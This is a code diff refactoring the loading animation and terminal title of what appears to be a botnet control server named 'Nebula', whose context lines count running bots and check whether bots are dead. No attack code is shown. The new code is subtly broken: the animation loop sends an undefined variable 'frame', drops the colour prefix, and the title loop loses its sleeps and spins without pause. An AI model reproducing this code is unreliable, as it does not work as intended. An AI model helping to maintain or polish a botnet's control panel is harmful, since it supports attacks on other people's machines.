@@ -135,41 +135,20 @@ def find_login(username, password):
 def loading(client):
     send(client, f'\33]0;\a', False)
     send(client, ansi_clear, False)
+    frames = [
+        "█▒▒▒▒▒▒▒▒▒ L _ ⏳",
+        "██▒▒▒▒▒▒▒ LO _ ⌛",
+        "███▒▒▒▒▒▒ LOA _ ⏳",
+        "████▒▒▒▒▒ LOAD _ ⌛",
+        "█████▒▒▒▒ LOADI _ ⏳",
+        "██████▒▒▒ LOADIN _ ⌛",
+        "███████▒▒ LOADING _ ⏳"
+    ]
     for number in range(int(random.randint(1, 3))):
-        send(client, f'''{color("LIGHTBLACK_EX")}█▒▒▒▒▒▒▒▒▒ L _ ⏳''')
-        send(client, f'\33]0;L _ ⌛ \a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color("LIGHTBLACK_EX")}██▒▒▒▒▒▒▒▒ LO _ ⌛''')
-        send(client, f'\33]0;LO _ ⏳ \a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color("LIGHTBLACK_EX")}███▒▒▒▒▒▒▒ LOA _ ⏳''')
-        send(client, f'\33]0;LOA _ ⌛ \a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color("LIGHTBLACK_EX")}█████▒▒▒▒▒ LOAD _ ⌛''')
-        send(client, f'\33]0;LOAD _ ⏳ \a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color("LIGHTBLACK_EX")}███████▒▒▒ LOADI _ ⏳''')
-        send(client, f'\33]0;LOADI _ ⌛ \a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color("LIGHTBLACK_EX")}█████████▒ LOADIN _ ⌛''')
-        send(client, f'\33]0;LOADIN _ ⏳ \a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
-
-        send(client, f'''{color("LIGHTBLACK_EX")}██████████ LOADING _ ⏳''')
-        send(client, f'\33]0;LOADING _ ⌛ \a', False)
-        time.sleep(0.2)
-        send(client, ansi_clear, False)
+        for a in [f"{color('LIGHTBLACK_EX')}{frame}" for frame in frames]:
+         send(client, frame)
+         time.sleep(0.2)
+         send(client, ansi_clear, False)
 
 # Checks if bots are dead
 def ping():
@@ -315,26 +294,10 @@ def user(args, send, client):
 def update_title(client, name):
     while 1:
         try:
-            send(client, f"\33]0;N | Running: {len(bots)} | Username: {name}\a", False)
-            time.sleep(1)
-            send(client, f"\33]0;Ne | Running: {len(bots)} | Username: {name}\a", False)
-            time.sleep(1)
-            send(client, f"\33]0;Neb | Running: {len(bots)} | Username: {name}\a", False)
-            time.sleep(1)
-            send(client, f"\33]0;Nebu | Running: {len(bots)} | Username: {name}\a", False)
-            time.sleep(1)
-            send(client, f"\33]0;Nebul | Running: {len(bots)} | Username: {name}\a", False)
-            time.sleep(1)
-            send(client, f"\33]0;Nebula | Running: {len(bots)} | Username: {name}\a", False)
-            time.sleep(1)
-            send(client, f"\33]0;Nebul | Running: {len(bots)} | Username: {name}\a", False)
-            time.sleep(1)
-            send(client, f"\33]0;Nebu | Running: {len(bots)} | Username: {name}\a", False)
-            time.sleep(1)
-            send(client, f"\33]0;Neb | Running: {len(bots)} | Username: {name}\a", False)
-            time.sleep(1)
-            send(client, f"\33]0;Ne | Running: {len(bots)} | Username: {name}\a", False)
-            time.sleep(1)
+            message = "NEBULA"
+            length = len(message)
+            for i in range(1, length + 1):send(client, f"\33]0;{message[:i]} | Running: {len(bots)} | Username: {name}\a", False)
+            for i in range(length - 1, 0, -1):send(client, f"\33]0;{message[:i]} | Running: {len(bots)} | Username: {name}\a", False)
         except:
             client.close()
 
